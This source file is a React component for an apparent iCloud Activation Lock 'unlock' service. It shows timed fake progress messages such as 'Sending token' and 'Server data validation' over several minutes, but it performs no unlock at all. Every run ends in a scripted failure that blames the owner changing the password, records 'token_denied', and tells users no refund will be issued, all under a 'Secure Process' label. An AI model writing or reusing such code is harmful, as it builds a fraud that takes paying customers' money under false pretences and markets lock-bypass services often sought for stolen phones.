import React, { useState } from 'react';
import Loader from '../Loader/Loader';
import { ShieldCheck, AlertCircle, Lock, Ticket } from 'lucide-react';
import { useAuth } from '../../contexts/AuthContext';
import { ticketService } from '../../services/ticketService';
import { updateDeviceUnlockResult } from '../../services/deviceService';
import { updateSerialDeviceUnlockResult } from '../../services/serialDeviceService';
import { useProcessTiming } from '../../hooks/useProcessTiming';

interface DeviceInfo {
  model: string;
  imei: string;
  img: string;
  deviceId?: string;
  deviceType?: 'applewatch' | 'ipad' | 'iphone';
}

interface UnlockFMIProps {
  deviceInfo: DeviceInfo;
}

const UnlockFMI: React.FC<UnlockFMIProps> = ({ deviceInfo }) => {
  const [loadMessage, setLoadMessage] = useState<string | null>(null);
  const [error, setError] = useState<boolean>(false);
  const [secondMsg, setSecondMsg] = useState<boolean>(false);
  const [showTicketForm, setShowTicketForm] = useState<boolean>(false);
  const [ticketText, setTicketText] = useState('');
  const [ticketSubmitted, setTicketSubmitted] = useState(false);
  const { currentUser } = useAuth();
  const { getRandomTime, getStepDistribution } = useProcessTiming();

  const handleUnlock = () => {
    setLoadMessage("Encrypting activation token");
    
    // Generar tiempo total aleatorio entre 5-15 minutos
    const totalTime = getRandomTime('unlock');
    const distribution = getStepDistribution('unlock', 1);
    
    // Dividir el tiempo en pasos proporcionales
    const step1Time = Math.floor(totalTime * (distribution.step1 / 100));
    const step2Time = Math.floor(totalTime * (distribution.step2 / 100));
    const step3Time = Math.floor(totalTime * (distribution.step3 / 100));
    const step4Time = Math.floor(totalTime * (distribution.step4 / 100));
    
    const steps = [
      { message: "Connecting with server", delay: step1Time },
      { message: "Sending token", delay: step2Time },
      { message: "Waiting for confirmation", delay: step3Time },
      { action: () => { setLoadMessage(null); setSecondMsg(true); }, delay: step4Time }
    ];
    
    let currentDelay = 0;
    steps.forEach(step => {
      currentDelay += step.delay;
      setTimeout(() => {
        if (step.message) setLoadMessage(step.message);
        if (step.action) step.action();
      }, currentDelay);
    });
  };

  const handleSecondMessage = () => {
    setLoadMessage("Establishing Connection");
    
    // Generar tiempo total aleatorio entre 5-15 minutos para la segunda fase
    const totalTime = getRandomTime('unlock');
    const distribution = getStepDistribution('unlock', 2);
    
    // Dividir el tiempo en pasos proporcionales
    const step1Time = Math.floor(totalTime * (distribution.step1 / 100));
    const step2Time = Math.floor(totalTime * (distribution.step2 / 100));
    const step3Time = Math.floor(totalTime * (distribution.step3 / 100));
    const step4Time = Math.floor(totalTime * (distribution.step4 / 100));
    
    const steps = [
      { message: "Waiting for confirmation from the network", delay: step1Time },
      { message: "Server data validation", delay: step2Time },
      { message: "Waiting for server confirmation", delay: step3Time },
      { action: () => { 
        setLoadMessage(null); 
        setSecondMsg(false); 
        setError(true);
        if (currentUser && deviceInfo.deviceId) {
          if (deviceInfo.deviceType === 'applewatch' || deviceInfo.deviceType === 'ipad') {
            updateSerialDeviceUnlockResult(currentUser.uid, deviceInfo.deviceId, 'token_denied');
          } else {
            updateDeviceUnlockResult(currentUser.uid, deviceInfo.deviceId, 'token_denied');
          }
        }
      }, delay: step4Time }
    ];
    
    let currentDelay = 0;
    steps.forEach(step => {
      currentDelay += step.delay;
      setTimeout(() => {
        if (step.message) setLoadMessage(step.message);
        if (step.action) step.action();
      }, currentDelay);
    });
  };

  const handleCreateTicket = () => {
    setShowTicketForm(true);
  };

  const handleSubmitTicket = async () => {
    if (!currentUser || !ticketText.trim()) return;
    
    try {
      await ticketService.createTicket(currentUser.uid, currentUser.email || '', {
        type: 'unlock_complaint',
        title: `Unlock process failed for ${deviceInfo.model}`,
        description: ticketText,
        priority: 'high',
        imei: deviceInfo.imei,
        model: deviceInfo.model
      });
      
      setTicketSubmitted(true);
    } catch (err) {
      console.error('Error submitting ticket:', err);
    }
  };

  return (
    <div className="p-6">
      <div className="flex items-center gap-4 mb-6">
        <img 
          src={deviceInfo.img} 
          alt={deviceInfo.model} 
          className="w-16 h-16 object-contain bg-gray-800 rounded-lg p-2"
        />
        <div>
          <h3 className="text-lg font-semibold text-white">{deviceInfo.model}</h3>
          <p className="text-gray-400 text-sm">IMEI: {deviceInfo.imei}</p>
        </div>
      </div>

      <div className="space-y-4">
        {loadMessage ? (
          <div className="flex flex-col items-center w-full transition-all duration-300 ease-in-out">
            <Loader />
            <p className="text-gray-400 text-sm mt-4 text-center font-medium">{loadMessage}</p>
          </div>
        ) : error ? (
          <div className="space-y-4">
            <div className="bg-red-500/90 text-white font-bold text-center py-3 px-4 rounded-lg flex items-center justify-center space-x-2 border border-red-600">
              <AlertCircle size={18} />
              <span>UNLOCK PROCESS FAILED</span>
            </div>
            <p className="text-red-500 font-semibold text-center">
              {!currentUser?.credits || currentUser.credits < 1 
                ? "iCloud Lock token sending failed, owner changed password was recently changed"
                : "The device password was recently changed"}
            </p>
            {!showTicketForm ? (
              <button
                onClick={handleCreateTicket}
                className="w-full py-3 px-4 bg-gray-700 text-white rounded-lg hover:bg-gray-600 transition-all duration-300 flex items-center justify-center gap-2"
              >
                <Ticket size={18} />
                Create Support Ticket
              </button>
            ) : !ticketSubmitted ? (
              <div className="bg-gray-800 p-4 rounded-lg space-y-3">
                <p className="text-gray-300 text-sm">
                  Your support ticket will be processed within 3 business days. Please note that if the device owner changed the password, no refund will be issued.
                </p>
                <textarea
                  value={ticketText}
                  onChange={(e) => setTicketText(e.target.value)}
                  placeholder="Describe your issue and request refund if applicable..."
                  className="w-full bg-gray-700 text-white rounded-lg p-3 text-sm"
                  rows={4}
                />
                <button 
                  onClick={handleSubmitTicket}
                  className="w-full py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 transition-all duration-300"
                >
                  Submit Ticket
                </button>
              </div>
            ) : (
              <div className="bg-green-500/20 p-4 rounded-lg">
                <p className="text-green-400 text-center font-medium">
                  Ticket submitted successfully! Our team will contact you within 24-48 hours with a resolution.
                </p>
              </div>
            )}
          </div>
        ) : secondMsg ? (
          <div className="space-y-4">
            <p className="text-white text-center font-medium">
              Turn on your device and insert sim card
            </p>
            <button 
              onClick={handleSecondMessage}
              className="w-full py-3 bg-white/10 border border-white/20 rounded-lg font-semibold text-white hover:bg-white/20 transition-all duration-300"
            >
              Continue
            </button>
          </div>
        ) : (
          <button 
            onClick={handleUnlock}
            className="w-full py-3 px-4 bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold rounded-lg hover:from-blue-600 hover:to-blue-700 transition-all duration-300 transform hover:scale-105 flex items-center justify-center gap-2"
          >
            <Lock size={18} />
            SEND TOKEN ACTIVATION
          </button>
        )}

        <div className="mt-6 p-4 bg-gray-800 rounded-lg">
          <div className="flex items-center gap-2 mb-2">
            <ShieldCheck size={16} className="text-green-400" />
            <p className="text-green-400 text-sm font-medium">Secure Process</p>
          </div>
          <p className="text-gray-400 text-sm">
            This unlock process is safe and will not void your warranty.
          </p>
        </div>
      </div>
    </div>
  );
};

export default UnlockFMI;